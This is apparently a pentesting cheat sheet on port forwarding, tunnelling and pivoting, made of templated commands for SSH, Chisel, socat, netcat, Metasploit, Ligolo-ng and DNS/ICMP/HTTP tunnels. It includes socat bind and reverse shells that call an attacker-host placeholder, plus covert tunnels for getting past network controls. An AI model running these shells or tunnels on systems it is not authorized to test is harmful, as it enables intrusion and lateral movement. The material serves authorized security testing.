# Redirection de port - Tunnel

## SSH Tunneling

```bash
# Local Port Forwarding
ssh -L {{local_port}}:{{target_ip}}:{{target_port}} {{user}}@{{ssh_server}}
ssh -L {{local_port}}:localhost:{{target_port}} {{user}}@{{machine_ip}}

# Remote Port Forwarding
ssh -R {{remote_port}}:{{target_ip}}:{{target_port}} {{user}}@{{ssh_server}}
ssh -R {{remote_port}}:localhost:{{local_port}} {{user}}@{{machine_ip}}

# Dynamic Port Forwarding (SOCKS Proxy)
ssh -D {{local_port}} {{user}}@{{machine_ip}}
ssh -D {{local_port}} -N -f {{user}}@{{machine_ip}}

# ProxyChains with SOCKS
# Edit /etc/proxychains.conf: socks5 127.0.0.1 {{local_port}}
proxychains nmap {{target_ip}}
proxychains curl http://{{target_ip}}

# Multiple hops
ssh -L {{local_port}}:{{target_ip}}:{{target_port}} -J {{user}}@{{jump_host}} {{user}}@{{final_host}}

# Keep alive
ssh -L {{local_port}}:{{target_ip}}:{{target_port}} {{user}}@{{machine_ip}} -o ServerAliveInterval=60
```

## Chisel

```bash
# Server (attacker)
chisel server -p {{port}} --reverse

# Client - Remote forward
chisel client {{lhost}}:{{port}} R:{{remote_port}}:{{target_ip}}:{{target_port}}

# Client - SOCKS proxy
chisel client {{lhost}}:{{port}} R:socks

# Client - Local forward
chisel client {{lhost}}:{{port}} {{local_port}}:{{target_ip}}:{{target_port}}

# Multiple tunnels
chisel client {{lhost}}:{{port}} R:8080:127.0.0.1:80 R:3306:127.0.0.1:3306
```

## Socat

```bash
# Port forwarding
socat TCP-LISTEN:{{local_port}},fork TCP:{{target_ip}}:{{target_port}}

# Reverse shell relay
socat TCP-LISTEN:{{port}},fork TCP:{{lhost}}:{{lport}}

# Encrypted bind shell
socat OPENSSL-LISTEN:{{port}},cert=server.pem,verify=0,fork EXEC:/bin/bash

# Encrypted reverse shell
socat OPENSSL:{{lhost}}:{{port}},verify=0 EXEC:/bin/bash

# UDP to TCP
socat UDP-LISTEN:{{port}},fork TCP:{{target_ip}}:{{target_port}}
```

## Netsh (Windows)

```cmd
# Port forwarding
netsh interface portproxy add v4tov4 listenport={{local_port}} listenaddress=0.0.0.0 connectport={{target_port}} connectaddress={{target_ip}}

# Show rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport={{local_port}} listenaddress=0.0.0.0

# Firewall rule
netsh advfirewall firewall add rule name="Port Forward" dir=in action=allow protocol=TCP localport={{local_port}}
```

## Plink (Windows)

```cmd
# Local forward
plink.exe -ssh -L {{local_port}}:{{target_ip}}:{{target_port}} {{user}}@{{ssh_server}}

# Remote forward
plink.exe -ssh -R {{remote_port}}:{{target_ip}}:{{target_port}} {{user}}@{{ssh_server}}

# Dynamic forward (SOCKS)
plink.exe -ssh -D {{local_port}} {{user}}@{{ssh_server}}

# Background
plink.exe -ssh -N -R {{remote_port}}:127.0.0.1:{{local_port}} {{user}}@{{lhost}}
```

## Netcat Relay

```bash
# Simple relay
mkfifo /tmp/pipe
nc -lvnp {{local_port}} < /tmp/pipe | nc {{target_ip}} {{target_port}} > /tmp/pipe

# Two-way relay
nc -lvnp {{local_port}} -c "nc {{target_ip}} {{target_port}}"

# Reverse relay
mknod /tmp/backpipe p
nc -lvnp {{local_port}} 0</tmp/backpipe | nc {{target_ip}} {{target_port}} 1>/tmp/backpipe
```

## Rinetd

```bash
# Config file /etc/rinetd.conf
0.0.0.0 {{local_port}} {{target_ip}} {{target_port}}

# Start rinetd
rinetd -c /etc/rinetd.conf

# Check
netstat -tulpn | grep rinetd
```

## Metasploit Portfwd

```bash
# In meterpreter
portfwd add -l {{local_port}} -p {{target_port}} -r {{target_ip}}
portfwd list
portfwd delete -l {{local_port}}

# Background route
background
route add {{subnet}} {{netmask}} {{session_id}}
route print

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT {{port}}
set VERSION 5
run -j
```

## SSHuttle

```bash
# VPN over SSH
sshuttle -r {{user}}@{{machine_ip}} {{subnet}}/{{cidr}}
sshuttle -r {{user}}@{{machine_ip}} 10.10.10.0/24

# All traffic through SSH
sshuttle -r {{user}}@{{machine_ip}} 0.0.0.0/0

# Exclude IPs
sshuttle -r {{user}}@{{machine_ip}} 10.10.10.0/24 -x {{exclude_ip}}

# DNS
sshuttle -r {{user}}@{{machine_ip}} --dns 10.10.10.0/24
```

## Ligolo-ng

```bash
# Server (attacker)
./proxy -selfcert

# Client (target)
./agent -connect {{lhost}}:11601 -ignore-cert

# In ligolo console
session
ifconfig
start

# Add route on attacker
ip route add {{subnet}}/{{cidr}} dev ligolo

# Listener
listener_add --addr 0.0.0.0:{{port}} --to 127.0.0.1:{{target_port}}
```

## DNS Tunneling

```bash
# Dnscat2 Server
dnscat2-server {{domain}}

# Dnscat2 Client
./dnscat {{domain}}

# Iodine Server
iodined -f -c -P {{password}} 10.0.0.1 {{domain}}

# Iodine Client
iodine -f -P {{password}} {{dns_server}} {{domain}}
```

## ICMP Tunneling

```bash
# ptunnel Server
ptunnel -x {{password}}

# ptunnel Client
ptunnel -p {{machine_ip}} -lp {{local_port}} -da {{target_ip}} -dp {{target_port}} -x {{password}}

# Hans Server
hans -s 10.1.2.0 -p {{password}}

# Hans Client
hans -c {{machine_ip}} -p {{password}}
```

## HTTP Tunneling

```bash
# reGeorg
python reGeorgSocksProxy.py -p {{port}} -u http://{{machine_ip}}/tunnel.jsp

# Neo-reGeorg
python neoreg.py -k {{password}} -u http://{{machine_ip}}/tunnel.php

# Tunna
python proxy.py -u http://{{machine_ip}}/conn.aspx -l {{local_port}} -r {{target_port}} -v
```

## ProxyChains Configuration

```bash
# Edit /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 {{port}}
socks4 127.0.0.1 {{port}}
http 127.0.0.1 {{port}}

# Usage
proxychains nmap -sT -Pn {{target_ip}}
proxychains curl http://{{target_ip}}
proxychains firefox
```

## Windows SOCKS Proxy

```powershell
# Invoke-SocksProxy
Import-Module .\Invoke-SocksProxy.psm1
Invoke-SocksProxy -bindPort {{port}}

# Netsh
netsh interface portproxy add v4tov4 listenport={{local_port}} connectaddress={{target_ip}} connectport={{target_port}}
```

## Port Knocking

```bash
# Knock sequence
for port in {{port1}} {{port2}} {{port3}}; do nmap -Pn --max-retries 0 -p $port {{machine_ip}}; done

# knock client
knock {{machine_ip}} {{port1}} {{port2}} {{port3}}

# After knocking
nc {{machine_ip}} {{hidden_port}}
```

## Double Pivot

```bash
# SSH through multiple hosts
ssh -J {{user1}}@{{pivot1}},{{user2}}@{{pivot2}} {{user3}}@{{target}}

# Chisel double pivot
# On pivot1
chisel server -p {{port1}} --reverse

# On pivot2
chisel client {{pivot1_ip}}:{{port1}} R:{{port2}}:socks

# On attacker
chisel client localhost:{{port2}} socks
```

## VPN

```bash
# OpenVPN
openvpn {{config}}.ovpn

# WireGuard
wg-quick up {{config}}
wg-quick down {{config}}
```

## Reverse Proxy

```bash
# NGINX config
server {
    listen {{port}};
    location / {
        proxy_pass http://{{target_ip}}:{{target_port}};
    }
}

# Start nginx
nginx -c /path/to/nginx.conf
```